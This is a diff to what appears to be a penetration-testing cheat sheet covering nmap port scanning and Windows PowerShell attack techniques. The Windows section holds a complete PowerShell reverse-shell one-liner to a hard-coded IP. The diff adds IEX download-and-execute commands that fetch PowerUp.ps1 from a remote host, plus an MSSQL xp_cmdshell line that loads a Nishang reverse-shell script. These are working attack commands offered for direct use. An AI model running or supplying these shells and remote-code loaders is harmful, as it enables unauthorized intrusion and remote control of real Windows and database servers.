@@ -141,7 +141,7 @@ Port Scanning
 #UDP (can take hours so maybe netstat is a better alternative)
 - nmap -sU --top-ports 10000
 - nmap -sT -sU -p 22,80,110 -A 
-- nmap -sT -sU -p- --min-rate 10000
+- nmap -sT -sU -p- --min-rate 2000
 - nmap -p- -sU -iL ips.txt > udp.txt 
 - nmap -sU -sV -iL ips.txt > alludpports.txt 
 
@@ -272,11 +272,20 @@ Windows Framework / Powershell
 ----------------
 - https://github.com/samratashok/nishang
 - https://github.com/rasta-mouse/Sherlock
-- Reverse Powershell:
+- Reverse Powershell: (sometimes powershell or echo may need to be infront of the string and sometimes quotes may be needed, e.g. powershell IEX or powershell "IEX..etc" or echo IEX).
 ```
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
-
+```
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:80/PowerUp.ps1') | powershell -noprofile -
+```
+```
+IEX(New-object Net.WebClient).DownloadString('http://10.10.10.10:80/PowerUp.ps1')
+```
+- Reverse Powershell using mssql:
+```
+xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\"http://10.10.10.10/Nishang-ReverseShell.ps1\")
+```
 Windows Post Exploitation Commands
 ----------------
 - WMIC USERACCOUNT LIST BRIEF
